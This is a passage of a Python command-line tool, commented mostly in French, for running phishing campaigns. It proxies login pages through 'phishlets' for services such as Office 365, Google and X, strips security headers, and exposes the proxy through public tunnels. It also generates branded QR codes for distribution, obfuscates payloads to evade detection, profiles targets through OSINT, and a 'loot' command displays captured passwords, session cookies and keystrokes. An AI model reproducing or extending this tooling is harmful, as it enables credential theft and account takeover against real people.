                    {"action": "remove", "name": "Report-To"},
                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
                    {"action": "remove", "name": "Permissions-Policy"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                _profile_http2 = False
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "30"
            except Exception as e:
                console.print(f"[yellow]Profil parano non appliqué: {e}[/yellow]")
        # Environnement réseau
        if rate is not None:
            os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
        if allow_ips is not None:
            os.environ["ALLOW_IPS"] = allow_ips
        if deny_ips is not None:
            os.environ["DENY_IPS"] = deny_ips
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        cfg.http2 = bool(http2) if _profile_http2 is None else bool(_profile_http2)
        cfg.connection_strategy = conn_strategy
        if upstream:
            cfg.upstream_http = upstream
        proxy = EdgeProxy(cfg)
        
        # WAN / Remote Access Info
        if tunnel:
            from core.net.tunnel import TunnelManager
            provider = tunnel if isinstance(tunnel, str) else "cloudflared"
            tm = TunnelManager(port=port, provider=provider)
            console.print(f"[yellow]Initialisation du tunnel WAN ({provider})...[/yellow]")
            try:
                public_url = asyncio.run(tm.start())
                console.print(f"[green]Tunnel Actif:[/green] {public_url}")
                os.environ["VANTA_PUBLIC_URL"] = public_url
                # Also clean the URL to get just the hostname for the interceptor
                if "://" in public_url:
                    os.environ["VANTA_PUBLIC_HOST"] = public_url.split("://")[1].split("/")[0]
            except Exception as e:
                console.print(f"[red]Tunnel Error: {e}[/red]")
        else:
            print_wan_info(port)

        console.print(f"[yellow]Starting Edge with {path}[/yellow]")
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Erreur: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("phishlets-list")
def phishlets_list():
    rows = []
    try:
        import yaml
        for fn in os.listdir("phishlets"):
            if not fn.endswith(".yaml"):
                continue
            path = os.path.join("phishlets", fn)
            with open(path, "r") as f:
                data = yaml.safe_load(f)
            name = data.get("name", fn[:-5])
            targets = []
            for m in data.get("proxy_hosts", []):
                t = m.get("target")
                if t:
                    targets.append(t)
            rows.append((fn[:-5], name, ", ".join(targets)))
    except Exception:
        pass
    table = Table(title="Phishlets disponibles")
    table.add_column("Fichier")
    table.add_column("Nom")
    table.add_column("Cibles")
    for f, n, t in sorted(rows):
        table.add_row(f, n, t)
    console.print(table)

@cli.command("safe-mode")
@click.option("--port", default=8888, type=int)
def safe_mode(port):
    try:
        import importlib.util
        import runpy
        runpy.run_path("safe_mode.py", run_name="__main__")
    except Exception as e:
        console.print(f"[red]Safe mode failed: {e}[/red]")

@cli.command("phishlets-audit")
@click.option("--allow", default="localhost,example.com", help="Suffixes de domaines autorisés (CSV)")
def phishlets_audit(allow):
    try:
        import yaml, glob, os
        allow_sfx = [s.strip() for s in allow.split(",") if s.strip()]
        files = glob.glob("phishlets/*.yaml")
        rows = []
        bad = 0
        for p in files:
            try:
                with open(p, "r") as f:
                    data = yaml.safe_load(f)
                hosts = [m.get("target","") for m in data.get("proxy_hosts", [])]
                bridges = [b.get("target_host","") for b in data.get("bridges", [])]
                offenders = []
                for h in hosts + bridges:
                    if not h:
                        continue
                    if not any(h==s or h.endswith("."+s) for s in allow_sfx):
                        offenders.append(h)
                rows.append((os.path.basename(p), data.get("name","?"), len(offenders), offenders[:5]))
                if offenders:
                    bad += 1
            except Exception:
                rows.append((os.path.basename(p), "N/A", -1, ["parse_error"]))
                bad += 1
        table = Table(title="Audit des phishlets")
        table.add_column("Fichier")
        table.add_column("Nom")
        table.add_column("Hôtes non autorisés")
        table.add_column("Exemples")
        for f, n, k, ex in rows:
            table.add_row(f, n, str(k), ", ".join(ex))
        console.print(table)
        if bad:
            console.print(f"[yellow]{bad} phishlet(s) avec hôtes hors liste autorisée[/yellow]")
        else:
            console.print("[green]Tous les phishlets respectent la liste autorisée[/green]")
    except Exception as e:
        console.print(f"[red]Audit échoué: {e}[/red]")

@cli.command("safe-link")
@click.option("--port", default=8888, type=int)
def safe_link(port):
    """Affiche une URL locale d'auto‑audit et la copie dans le presse‑papiers si possible"""
    url = f"http://localhost:{port}/"
    console.print(f"[bold green]Safe URL:[/bold green] {url}")
    try:
        import shutil, subprocess
        if shutil.which("pbcopy"):
            subprocess.run("pbcopy", input=url.encode(), check=False)
            console.print("[cyan]Copied to clipboard[/cyan]")
    except Exception:
        pass

@cli.command("safe-qr")
@click.option("--url", help="URL cible (par défaut: http://localhost:8888/)")
@click.option("--port", default=8888, type=int, help="Port si --url non fourni")
@click.option("--out", default="safe_qr.png", help="Fichier PNG de sortie")
@click.option("--logo", help="Chemin vers un logo à incruster (PNG)")
@click.option("--validate/--no-validate", default=True, help="Valider le lien avant génération")
@click.option("--error-correction", type=click.Choice(['L', 'M', 'Q', 'H']), default='H', 
              help="Niveau correction erreur: L(7%), M(15%), Q(25%), H(30%)")
@click.option("--color", default="black", help="Couleur du QR (nom ou hex: #FF0000)")
@click.option("--bg-color", default="white", help="Couleur de fond")
def safe_qr(url, port, out, logo, validate, error_correction, color, bg_color):
    """Génération robuste de QR code avec validation, customisation avancée et métriques"""
    tgt = url or f"http://localhost:{port}/"
    console.print(f"[cyan]🔗 Génération QR robuste pour: {tgt}[/cyan]")
    
    # Mapping niveau correction
    correction_map = {
        'L': QRCorrectionLevel.LOW,
        'M': QRCorrectionLevel.MEDIUM, 
        'Q': QRCorrectionLevel.QUALITY,
        'H': QRCorrectionLevel.HIGH
    }
    
    # Configuration avancée
    config = QRConfig(
        error_correction=correction_map[error_correction],
        fill_color=color,
        back_color=bg_color,
        logo_path=logo
    )
    
    # Génération avec validation
    result = qr_link_system.generate_qr_with_link_validation(
        url=tgt,
        output_path=out,
        validate=validate,
        config=config
    )
    
    if result["qr_generated"]:
        console.print(f"[green]✅ QR généré avec succès: {out}[/green]")
        
        # Affichage des détails de validation
        if validate:
            status = "✅" if result["link_valid"] else "⚠️"
            console.print(f"   {status} Lien validé: {result['validation_result']}")
            
            if not result["link_valid"] and result["validation_result"] == "localhost_only":
                console.print("   [yellow]ℹ️  Service local non démarré - QR généré quand même[/yellow]")
        
        # Métriques de performance
        metrics = result["metrics"]
        console.print(f"   📊 Métriques: {metrics['successful_checks']}/{metrics['total_checks']} succès")
        
    else:
        console.print(f"[red]❌ Erreur génération QR: {result.get('error', 'Unknown error')}[/red]")
        
        # Guide d'installation si dépendances manquantes
        if "Dépendances manquantes" in str(result.get('error', '')):
            install_guide = qr_link_system.get_installation_guide()
            console.print(f"[yellow]📦 Installation requise:[/yellow] {install_guide}")

@cli.command("ui")
@click.option("--port", default=8080, type=int)
def ui(port):
    """Lance l'interface Web locale (UI)"""
    app_code = (
        "from core.web.server import create_app\n"
        "app = create_app()\n"
    )
    path = "v5_ui_app.py"
    with open(path, "w") as f:
        f.write(app_code)
    console.print(f"[yellow]Démarrage de l'UI sur le port {port}[/yellow]")
    subprocess.Popen([sys.executable, "-m", "uvicorn", "v5_ui_app:app", "--port", str(port)])

@cli.command("smoke")
def smoke():
    """Exécute le smoke test multi‑OS (liens/QR/ports)"""
    script = Path("scripts/smoke_check.py")
    if not script.exists():
        console.print("[red]Script de smoke test introuvable[/red]")
        return
    console.print("[yellow]Exécution du smoke test...[/yellow]")
    try:
        import runpy
        runpy.run_path(str(script), run_name="__main__")
        console.print("[green]Smoke test terminé[/green]")
    except SystemExit as e:
        code = getattr(e, "code", 1) or 0
        if code == 0:
            console.print("[green]Smoke test terminé[/green]")
        else:
            console.print("[red]Smoke test en erreur[/red]")
    except Exception as e:
        console.print(f"[red]Smoke test en erreur: {e}[/red]")

@cli.command("tunnel")
@click.option("--port", default=8080, type=int, help="Port local à exposer")
@click.option("--provider", default="cloudflared", type=click.Choice(["cloudflared","ngrok","localhost.run"]), help="Fournisseur de tunnel")
@click.option("--qr-out", default="wan_qr.png", help="Fichier QR de sortie")
def tunnel(port, provider, qr_out):
    """Démarre un tunnel WAN et génère un QR pointant vers l'URL publique"""
    console.print(f"[yellow]Démarrage tunnel {provider} sur localhost:{port}[/yellow]")
    try:
        tm = TunnelManager(port=port, provider=provider)
        public_url = asyncio.run(tm.start())
        console.print(f"[green]Tunnel actif:[/green] {public_url}")
        is_valid, result, details = qr_link_system.validate_url(public_url, timeout=5)
        status = "✅" if is_valid else f"⚠️ {result.value}"
        console.print(f"   Vérification WAN: {status}")
        res = qr_link_system.generate_qr_with_link_validation(url=public_url, output_path=qr_out, validate=False)
        if res.get("qr_generated"):
            console.print(f"[green]QR WAN généré:[/green] {qr_out}")
        else:
            console.print(f"[yellow]QR non généré:[/yellow] {res.get('error')}")
    except Exception as e:
        console.print(f"[red]Tunnel error:[/red] {e}")

@cli.command()
@click.option("--open-server", is_flag=True, help="Start demo server after run")
def lunar(open_server):
    """Lunar Mode: mutation + scanner + autopilot cycle with metrics"""
    console.print("[magenta]Launching Lunar Mode[/magenta]")
    # Sample HTML to mutate and scan
    html = "<html><body class='login-form'><script>eval('bad');</script></body></html>"
    engine = MutationEngine()
    mutated = engine.mutate_html(html)
    scanner = DetectionScanner()
    res = scanner.scan_content(mutated)
    MUTATION_OPS.inc()
    if res["status"] == "RISKY":
        DETECTION_EVENTS.inc()
    console.print("[bold]Scan Result:[/bold] " + str(res))
    # Autopilot event
    ap = Autopilot()
    asyncio.run(ap.process_event({"type": "detection_alert", "source": "LunarTest", "campaign_id": "lunar-001"}))
    if open_server:
        console.print("[yellow]Opening demo server[/yellow]")
        demo.callback(8000)  # type: ignore

@cli.command()
@click.option("--name", prompt="Campaign Name", help="Name of the campaign")
@click.option("--target", prompt="Target Profile", help="Target organization/profile")
def setup(name, target):
    """Initialize a new campaign structure"""
    console.print(f"[green]Initializing campaign: {name} (Target: {target})[/green]")
    # TODO: Create campaign directory and config from template
    console.print("[bold]Done.[/bold]")

@cli.command()
@click.option("--campaign", required=True, help="Campaign ID to run")
def run(campaign):
    """Launch a campaign (Delivery + Edge)"""
    console.print(f"[yellow]Launching campaign {campaign}...[/yellow]")
    # TODO: Invoke Orchestrator
    console.print("[green]Campaign is RUNNING[/green]")

@cli.command()
@click.option("--file", required=True, help="Input HTML/JS file")
def mutate(file):
    """Obfuscate and mutate a payload file"""
    try:
        with open(file, 'r') as f:
            content = f.read()
        
        engine = MutationEngine()
        if file.endswith(".html"):
            mutated = engine.mutate_html(content)
        elif file.endswith(".js"):
            mutated = engine.mutate_js(content)
        else:
            console.print("[red]Unsupported file type[/red]")
            return

        out_file = f"{file}.mutated"
        with open(out_file, 'w') as f:
            f.write(mutated)
            
        console.print(f"[green]Mutation complete. Saved to {out_file}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

@cli.command("scan-file")
@click.option("--file", required=True, help="File to analyze")
def scan_file(file):
    """Scan a file for detection signatures"""
    try:
        with open(file, 'r') as f:
            content = f.read()
            
        scanner = DetectionScanner()
        result = scanner.scan_content(content)
        
        table = Table(title="Analysis Result")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        
        table.add_row("Status", result["status"])
        table.add_row("Risk Score", str(result["score"]))
        table.add_row("Signatures", ", ".join(result["matches"]))
        
        console.print(table)
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

@cli.command("analyze")
@click.option("--target", required=True, help="Cible à analyser (ex: @pseudo)")
@click.option("--platform", required=True, help="Plateforme cible (ex: twitter, linkedin)")
@click.option("--out", default="target_profile.json", help="Fichier JSON de sortie")
def analyze(target, platform, out):
    """Analyse OSINT approfondie & Reconnaissance"""
    console.print(f"[bold blue]Lancement de la reconnaissance sur {target} ({platform})[/bold blue]")
    try:
        recon = get_recon_module(platform, target)
        data = recon.analyze()
        
        table = Table(title=f"Résultats Reconnaissance: {target}")
        table.add_column("Champ", style="cyan")
        table.add_column("Valeur", style="green")
        
        for k, v in data.items():
            table.add_row(k, str(v))
        
        console.print(table)
        
        with open(out, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"[bold green]✓ Données sauvegardées dans {out}[/bold green]")
        
        # Suggest next steps
        phishlet_path = f"phishlets/{platform.lower()}.yaml"
        # Try aliases
        aliases = {
            "x": "x.yaml", "twitter": "x.yaml",
            "microsoft": "o365.yaml", "office365": "o365.yaml",
            "google": "google.yaml", "gmail": "google.yaml"
        }
        if platform.lower() in aliases:
            phishlet_path = f"phishlets/{aliases[platform.lower()]}"
        
        if os.path.exists(phishlet_path):
            console.print(f"\n[bold yellow]Prochaines étapes suggérées:[/bold yellow]")
            console.print(f"1. [bold]Armement[/bold]: Configurer le phishlet\n   [green]vanta edge-run --path {phishlet_path}[/green]")
            console.print(f"2. [bold]Distribution[/bold]: Générer QR Code\n   [green]vanta safe-qr --url http://<YOUR_IP>:8443 --logo core/assets/logos/{platform.lower()}.png[/green]")
            
    except Exception as e:
        console.print(f"[bold red]Erreur: {e}[/bold red]")

@cli.command("loot")
@click.option("--id", help="Session ID to export or view")
@click.option("--export", help="Export to JSON file")
def loot(id, export):
    """Manage captured sessions and credentials (Access)"""
    try:
        from core.edge.session import SessionManager
        
        sm = SessionManager()
        sessions = sm.get_all_sessions()
        
        if not sessions:
            console.print("[yellow]No sessions captured yet.[/yellow]")
            return

        if id:
            session = sm.get_session(id)
            if not session:
                console.print(f"[red]Session {id} not found[/red]")
                return
            
            if export:
                with open(export, "w") as f:
                    f.write(session.model_dump_json(indent=2))
                console.print(f"[green]Session {id} exported to {export}[/green]")
            else:
                console.print(f"[bold blue]Session Details: {id}[/bold blue]")
                console.print(f"Phishlet: {session.phishlet_name}")
                console.print(f"IP: {session.remote_ip}")
                console.print(f"User-Agent: {session.user_agent}")
                console.print(f"Authenticated: {session.is_authenticated}")
                
                if session.credentials:
                    console.print("\n[bold red]Credentials:[/bold red]")
                    for cred in session.credentials:
                        console.print(f"  User: {cred.username} | Pass: {cred.password} | Url: {cred.url}")
                
                if session.tokens:
                    console.print("\n[bold yellow]Tokens (Cookies):[/bold yellow]")
                    for k, v in session.tokens.items():
                        console.print(f"  {k}: {v[:20]}...")
                
                if session.behavior_data:
                    console.print("\n[bold cyan]Behavior Data:[/bold cyan]")
                    console.print(f"  Keystrokes: {len(session.behavior_data.get('keystrokes', []))}")
                    console.print(f"  Clicks: {len(session.behavior_data.get('clicks', []))}")
                    console.print(f"  Inputs: {list(session.behavior_data.get('inputs', {}).keys())}")

        else:
            table = Table(title="Captured Sessions (Loot)")
            table.add_column("ID", style="cyan")
            table.add_column("Phishlet", style="magenta")
            table.add_column("IP", style="green")
            table.add_column("Auth?", style="yellow")
            table.add_column("Creds", style="red")
            table.add_column("Last Active", style="blue")
            
            for s in sessions:
                table.add_row(
                    s.session_id,
                    s.phishlet_name,
                    s.remote_ip,
                    "YES" if s.is_authenticated else "NO",
                    str(len(s.credentials)),
                    s.last_activity.strftime("%Y-%m-%d %H:%M:%S")
                )
            console.print(table)
            console.print("\n[dim]Use --id <ID> to view details or export[/dim]")

    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

if __name__ == "__main__":
    cli()
